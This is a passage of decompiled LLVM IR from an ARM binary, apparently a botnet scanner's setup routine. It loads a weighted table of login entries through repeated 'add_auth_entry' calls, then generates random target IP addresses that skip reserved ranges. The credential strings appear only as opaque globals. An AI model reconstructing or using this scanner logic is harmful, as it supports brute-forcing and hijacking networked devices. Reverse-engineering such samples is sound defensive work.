  %v5_dc50 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([7 x i8]* @global_var_18480.354 to i32), i32 %v0_dc4c)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18488.356 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_dc60 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18488.356 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18490.358 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_dc70 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18490.358 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1849c.360 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_dc80 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint ([9 x i8]* @global_var_1849c.360 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_184a8.362 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_dc90 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint ([6 x i8]* @global_var_184a8.362 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_184a8.362 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_184a8.362 to i32), i32* %r1.global-to-local, align 4
  %v5_dca0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_184a8.362 to i32), i32 ptrtoint ([6 x i8]* @global_var_184a8.362 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_184b0.364 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_184b0.364 to i32), i32* %r1.global-to-local, align 4
  %v5_dcb0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_184b0.364 to i32), i32 ptrtoint ([8 x i8]* @global_var_184b0.364 to i32), i32 7)
  store i32 ptrtoint (i32* @global_var_184b8.366 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_181d4.196 to i32), i32* %r1.global-to-local, align 4
  %v0_dcbc = load i32, i32* @r4, align 4
  store i32 %v0_dcbc, i32* %r2.global-to-local, align 4
  %v4_dcc0 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_184b8.366 to i32), i32 ptrtoint ([7 x i8]* @global_var_181d4.196 to i32), i32 %v0_dcbc)
  store i32 ptrtoint ([4 x i8]* @global_var_184c0.368 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1816c.172 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_dcd0 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_184c0.368 to i32), i32 ptrtoint ([9 x i8]* @global_var_1816c.172 to i32), i32 8)
  store i32 ptrtoint ([7 x i8]* @global_var_184c4.370 to i32), i32* %r0.global-to-local, align 4
  %v0_dcd8 = load i32, i32* @r4, align 4
  store i32 %v0_dcd8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_184c4.370 to i32), i32* %r1.global-to-local, align 4
  %v5_dce0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_184c4.370 to i32), i32 ptrtoint ([7 x i8]* @global_var_184c4.370 to i32), i32 %v0_dcd8)
  store i32 ptrtoint ([6 x i8]* @global_var_184cc.372 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_184d4.374 to i32), i32* %r1.global-to-local, align 4
  %v0_dcec = load i32, i32* @r4, align 4
  store i32 %v0_dcec, i32* %r2.global-to-local, align 4
  %v4_dcf0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_184cc.372 to i32), i32 ptrtoint (i32* @global_var_184d4.374 to i32), i32 %v0_dcec)
  store i32 ptrtoint ([7 x i8]* @global_var_184dc.376 to i32), i32* %r0.global-to-local, align 4
  %v0_dcf8 = load i32, i32* @r4, align 4
  store i32 %v0_dcf8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_184dc.376 to i32), i32* %r1.global-to-local, align 4
  %v5_dd00 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_184dc.376 to i32), i32 ptrtoint ([7 x i8]* @global_var_184dc.376 to i32), i32 %v0_dcf8)
  store i32 ptrtoint ([6 x i8]* @global_var_184e4.378 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_184e4.378 to i32), i32* %r1.global-to-local, align 4
  %v5_dd10 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_184e4.378 to i32), i32 ptrtoint ([6 x i8]* @global_var_184e4.378 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_184ec.380 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_184ec.380 to i32), i32* %r1.global-to-local, align 4
  %v5_dd20 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_184ec.380 to i32), i32 ptrtoint ([8 x i8]* @global_var_184ec.380 to i32), i32 7)
  store i32 ptrtoint ([4 x i8]* @global_var_184f4.382 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_184f4.382 to i32), i32* %r1.global-to-local, align 4
  %v5_dd30 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_184f4.382 to i32), i32 ptrtoint ([4 x i8]* @global_var_184f4.382 to i32), i32 3)
  store i32 ptrtoint ([4 x i8]* @global_var_184f8.384 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_184f8.384 to i32), i32* %r1.global-to-local, align 4
  %v5_dd40 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_184f8.384 to i32), i32 ptrtoint ([4 x i8]* @global_var_184f8.384 to i32), i32 3)
  store i32 ptrtoint (i32* @global_var_184fc.386 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_184fc.386 to i32), i32* %r1.global-to-local, align 4
  %v3_dd50 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_184fc.386 to i32), i32 ptrtoint (i32* @global_var_184fc.386 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18504.388 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18504.388 to i32), i32* %r1.global-to-local, align 4
  %v5_dd60 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18504.388 to i32), i32 ptrtoint ([5 x i8]* @global_var_18504.388 to i32), i32 4)
  store i32 ptrtoint ([7 x i8]* @global_var_1850c.390 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32* %r1.global-to-local, align 4
  %v0_dd6c = load i32, i32* @r4, align 4
  store i32 %v0_dd6c, i32* %r2.global-to-local, align 4
  %v4_dd70 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1850c.390 to i32), i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32 %v0_dd6c)
  store i32 ptrtoint ([6 x i8]* @global_var_18514.392 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182e4.182 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_dd80 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18514.392 to i32), i32 ptrtoint (i32* @global_var_182e4.182 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18514.392 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18154.164 to i32), i32* %r1.global-to-local, align 4
  %v0_dd8c = load i32, i32* @r4, align 4
  store i32 %v0_dd8c, i32* %r2.global-to-local, align 4
  %v4_dd90 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18514.392 to i32), i32 ptrtoint (i32* @global_var_18154.164 to i32), i32 %v0_dd8c)
  store i32 ptrtoint ([7 x i8]* @global_var_1851c.394 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32* %r1.global-to-local, align 4
  %v0_dd9c = load i32, i32* @r4, align 4
  store i32 %v0_dd9c, i32* %r2.global-to-local, align 4
  %v4_dda0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1851c.394 to i32), i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32 %v0_dd9c)
  store i32 ptrtoint ([7 x i8]* @global_var_1851c.394 to i32), i32* %r0.global-to-local, align 4
  %v0_dda8 = load i32, i32* @r4, align 4
  store i32 %v0_dda8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1851c.394 to i32), i32* %r1.global-to-local, align 4
  %v5_ddb0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1851c.394 to i32), i32 ptrtoint ([7 x i8]* @global_var_1851c.394 to i32), i32 %v0_dda8)
  store i32 ptrtoint ([5 x i8]* @global_var_18524.396 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18524.396 to i32), i32* %r1.global-to-local, align 4
  %v5_ddc0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18524.396 to i32), i32 ptrtoint ([5 x i8]* @global_var_18524.396 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_1852c.398 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_ddd0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1852c.398 to i32), i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_18534.400 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_dde0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18534.400 to i32), i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 7)
  store i32 ptrtoint ([7 x i8]* @global_var_1853c.402 to i32), i32* %r0.global-to-local, align 4
  %v0_dde8 = load i32, i32* @r4, align 4
  store i32 %v0_dde8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1853c.402 to i32), i32* %r1.global-to-local, align 4
  %v5_ddf0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1853c.402 to i32), i32 ptrtoint ([7 x i8]* @global_var_1853c.402 to i32), i32 %v0_dde8)
  store i32 ptrtoint ([6 x i8]* @global_var_18544.404 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1854c.406 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_de00 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18544.404 to i32), i32 ptrtoint ([6 x i8]* @global_var_1854c.406 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18554.408 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1855c.410 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_de10 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18554.408 to i32), i32 ptrtoint ([5 x i8]* @global_var_1855c.410 to i32), i32 5)
  store i32 ptrtoint (i32* @global_var_18564.412 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18564.412 to i32), i32* %r1.global-to-local, align 4
  %v3_de20 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_18564.412 to i32), i32 ptrtoint (i32* @global_var_18564.412 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_182f8.414 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1856c.416 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_de30 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_182f8.414 to i32), i32 ptrtoint (i32* @global_var_1856c.416 to i32), i32 8)
  store i32 ptrtoint ([7 x i8]* @global_var_18578.418 to i32), i32* %r0.global-to-local, align 4
  %v0_de38 = load i32, i32* @r4, align 4
  store i32 %v0_de38, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18578.418 to i32), i32* %r1.global-to-local, align 4
  %v5_de40 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_18578.418 to i32), i32 ptrtoint ([7 x i8]* @global_var_18578.418 to i32), i32 %v0_de38)
  store i32 ptrtoint (i32* @global_var_18580.420 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18588.422 to i32), i32* %r1.global-to-local, align 4
  %v0_de4c = load i32, i32* @r4, align 4
  store i32 %v0_de4c, i32* %r2.global-to-local, align 4
  %v4_de50 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_18580.420 to i32), i32 ptrtoint ([7 x i8]* @global_var_18588.422 to i32), i32 %v0_de4c)
  store i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18590.424 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_de60 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32 ptrtoint ([9 x i8]* @global_var_18590.424 to i32), i32 8)
  store i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1859c.426 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_de70 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32 ptrtoint ([9 x i8]* @global_var_1859c.426 to i32), i32 8)
  %v0_de74 = load i32, i32* @r4, align 4
  store i32 %v0_de74, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_185a8.428 to i32), i32* %r1.global-to-local, align 4
  %v4_de80 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32 ptrtoint ([7 x i8]* @global_var_185a8.428 to i32), i32 %v0_de74)
  store i32 ptrtoint (i32* @global_var_185b0.430 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_185bc.432 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v4_de90 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_185b0.430 to i32), i32 ptrtoint ([5 x i8]* @global_var_185bc.432 to i32), i32 11)
  store i32 ptrtoint ([9 x i8]* @global_var_185c4.434 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_185c4.434 to i32), i32* %r1.global-to-local, align 4
  %v5_dea0 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_185c4.434 to i32), i32 ptrtoint ([9 x i8]* @global_var_185c4.434 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_185d0.436 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_185d0.436 to i32), i32* %r1.global-to-local, align 4
  %v5_deb0 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_185d0.436 to i32), i32 ptrtoint ([9 x i8]* @global_var_185d0.436 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_185dc.438 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_185dc.438 to i32), i32* %r1.global-to-local, align 4
  %v5_dec0 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_185dc.438 to i32), i32 ptrtoint ([9 x i8]* @global_var_185dc.438 to i32), i32 8)
  store i32 ptrtoint (i32* @global_var_182e0.254 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182e0.254 to i32), i32* %r1.global-to-local, align 4
  %v3_ded0 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_182e0.254 to i32), i32 ptrtoint (i32* @global_var_182e0.254 to i32), i32 8)
  store i32 ptrtoint (i32* @global_var_185e8.440 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185e8.440 to i32), i32* %r1.global-to-local, align 4
  %v3_dee0 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_185e8.440 to i32), i32 ptrtoint (i32* @global_var_185e8.440 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_185f4.442 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_185f4.442 to i32), i32* %r1.global-to-local, align 4
  %v5_def0 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_185f4.442 to i32), i32 ptrtoint ([9 x i8]* @global_var_185f4.442 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_18600.444 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18600.444 to i32), i32* %r1.global-to-local, align 4
  %v5_df00 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_18600.444 to i32), i32 ptrtoint ([9 x i8]* @global_var_18600.444 to i32), i32 8)
  store i32 ptrtoint ([8 x i8]* @global_var_1860c.446 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_181e4.200 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_df10 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1860c.446 to i32), i32 ptrtoint ([11 x i8]* @global_var_181e4.200 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18614.448 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_df20 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_18614.448 to i32), i32 13)
  store i32 ptrtoint ([6 x i8]* @global_var_184cc.372 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18624.450 to i32), i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v4_df30 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_184cc.372 to i32), i32 ptrtoint (i32* @global_var_18624.450 to i32), i32 14)
  store i32 ptrtoint ([10 x i8]* @global_var_18634.452 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18640.454 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_df40 = call i32 @add_auth_entry(i32 ptrtoint ([10 x i8]* @global_var_18634.452 to i32), i32 ptrtoint (i32* @global_var_18640.454 to i32), i32 10)
  store i32 ptrtoint ([10 x i8]* @global_var_1864c.456 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_18658.458 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_df50 = call i32 @add_auth_entry(i32 ptrtoint ([10 x i8]* @global_var_1864c.456 to i32), i32 ptrtoint ([11 x i8]* @global_var_18658.458 to i32), i32 10)
  store i32 ptrtoint ([10 x i8]* @global_var_18664.460 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18420.334 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_df60 = call i32 @add_auth_entry(i32 ptrtoint ([10 x i8]* @global_var_18664.460 to i32), i32 ptrtoint (i32* @global_var_18420.334 to i32), i32 10)
  store i32 ptrtoint ([10 x i8]* @global_var_18670.462 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18420.334 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_df70 = call i32 @add_auth_entry(i32 ptrtoint ([10 x i8]* @global_var_18670.462 to i32), i32 ptrtoint (i32* @global_var_18420.334 to i32), i32 10)
  store i32 ptrtoint (i32* @global_var_185b0.430 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1867c.464 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v3_df80 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_185b0.430 to i32), i32 ptrtoint (i32* @global_var_1867c.464 to i32), i32 11)
  store i32 ptrtoint ([13 x i8]* @global_var_18688.466 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_18698.468 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_df90 = call i32 @add_auth_entry(i32 ptrtoint ([13 x i8]* @global_var_18688.466 to i32), i32 ptrtoint ([13 x i8]* @global_var_18698.468 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_186a8.470 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_186b0.472 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_dfa0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_186a8.470 to i32), i32 ptrtoint (i32* @global_var_186b0.472 to i32), i32 13)
  store i32 ptrtoint ([9 x i8]* @global_var_186b8.474 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_186c4.476 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_dfb0 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_186b8.474 to i32), i32 ptrtoint ([8 x i8]* @global_var_186c4.476 to i32), i32 15)
  store i32 ptrtoint ([12 x i8]* @global_var_186cc.478 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_186d8.480 to i32), i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_dfc0 = call i32 @add_auth_entry(i32 ptrtoint ([12 x i8]* @global_var_186cc.478 to i32), i32 ptrtoint (i32* @global_var_186d8.480 to i32), i32 20)
  store i32 ptrtoint ([6 x i8]* @global_var_186e4.482 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_186d8.480 to i32), i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v4_dfd0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_186e4.482 to i32), i32 ptrtoint (i32* @global_var_186d8.480 to i32), i32 14)
  store i32 %v4_dfd0, i32* %r0.global-to-local, align 4
  %v2_dfd8 = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_dfd8, i32* @lr, align 4
  br label %dec_label_pc_dfe0

dec_label_pc_dfe0:                                ; preds = %dec_label_pc_e720, %dec_label_pc_d328
  %stack_var_-1880.0 = phi i32 [ %v2_dfd8, %dec_label_pc_d328 ], [ %stack_var_-1880.1, %dec_label_pc_e720 ]
  %stack_var_-1876.0 = phi i16 [ %v5_d320.le, %dec_label_pc_d328 ], [ %stack_var_-1876.1, %dec_label_pc_e720 ]
  store i32 ptrtoint (i32* @global_var_20f84.119 to i32), i32* %r0.global-to-local, align 4
  %v2_dfe4 = load i32, i32* @global_var_20f84.119, align 4
  store i32 %v2_dfe4, i32* @r4, align 4
  %v0_dfe8 = load i32, i32* @fp, align 4
  %v3_dfe8 = icmp uge i32 %v0_dfe8, %v2_dfe4
  store i1 %v3_dfe8, i1* %cpsr_c.global-to-local, align 1
  %v9_dfe8 = icmp eq i32 %v0_dfe8, %v2_dfe4
  store i1 %v9_dfe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dfe8, label %dec_label_pc_e268, label %dec_label_pc_dff0

dec_label_pc_dff0:                                ; preds = %dec_label_pc_dfe0
  store i32 0, i32* %r3.global-to-local, align 4
  store i16 0, i16* %stack_var_-52, align 2
  %v2_dff8 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_dff8, i32* @r5, align 4
  br label %dec_label_pc_dffc

dec_label_pc_dffc:                                ; preds = %.thread39, %dec_label_pc_dff0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_e010 = call i32 @rand_next()
  %v1_e010 = trunc i32 %v0_e010 to i16
  store i32 %v0_e010, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23a4c.55 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_20f54.134 to i32), i32* %r2.global-to-local, align 4
  %v2_e01c = load i32, i32* @global_var_23a4c.55, align 4
  store i32 %v2_e01c, i32* %r3.global-to-local, align 4
  store i16 %v1_e010, i16* bitcast (i32* @global_var_20f58.140 to i16*), align 4
  store i32 %v2_e01c, i32* @global_var_20f60.483, align 4
  br label %dec_label_pc_e028

dec_label_pc_e028:                                ; preds = %dec_label_pc_e0fc, %dec_label_pc_e058, %dec_label_pc_e130, %dec_label_pc_e124, %dec_label_pc_e118, %dec_label_pc_e10c, %.thread30, %bb367, %bb366, %bb365, %bb364, %bb363, %dec_label_pc_e0f4, %dec_label_pc_e0ec, %bb359, %dec_label_pc_e0bc, %dec_label_pc_e098, %bb352, %dec_label_pc_e068, %bb351, %dec_label_pc_e050, %bb350, %bb369, %dec_label_pc_dffc
  %v0_e028 = call i32 @rand_next()
  store i32 %v0_e028, i32* %r0.global-to-local, align 4
  %v1_e02c = urem i32 %v0_e028, 256
  store i32 %v1_e02c, i32* %r1.global-to-local, align 4
  %v3_e030 = udiv i32 %v0_e028, 256
  store i32 %v3_e030, i32* %r3.global-to-local, align 4
  %v3_e034 = udiv i32 %v0_e028, 65536
  store i32 %v3_e034, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e038 = icmp eq i32 %v1_e02c, 0
  store i1 %v2_e038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e038, label %bb350, label %bb349

bb349:                                            ; preds = %dec_label_pc_e028
  %v3_e03c = icmp ugt i32 %v1_e02c, 126
  store i1 %v3_e03c, i1* %cpsr_c.global-to-local, align 1
  %v8_e03c = icmp eq i32 %v1_e02c, 127
  store i1 %v8_e03c, i1* %cpsr_z.global-to-local, align 1
  br label %bb350

bb350:                                            ; preds = %dec_label_pc_e028, %bb349
  %v0_e04c = phi i1 [ true, %dec_label_pc_e028 ], [ %v8_e03c, %bb349 ]
  %v1_e040 = urem i32 %v3_e030, 256
  store i32 %v1_e040, i32* %ip.global-to-local, align 4
  %v1_e044 = urem i32 %v3_e034, 256
  store i32 %v1_e044, i32* %r2.global-to-local, align 4
  %v1_e048 = and i32 %v0_e028, 8388608
  %v2_e048 = icmp ne i32 %v1_e048, 0
  store i1 %v2_e048, i1* %cpsr_c.global-to-local, align 1
  %v3_e048 = udiv i32 %v0_e028, 16777216
  store i32 %v3_e048, i32* %r0.global-to-local, align 4
  br i1 %v0_e04c, label %dec_label_pc_e028, label %dec_label_pc_e050

dec_label_pc_e050:                                ; preds = %bb350
  %v2_e050 = icmp ugt i32 %v1_e02c, 2
  store i1 %v2_e050, i1* %cpsr_c.global-to-local, align 1
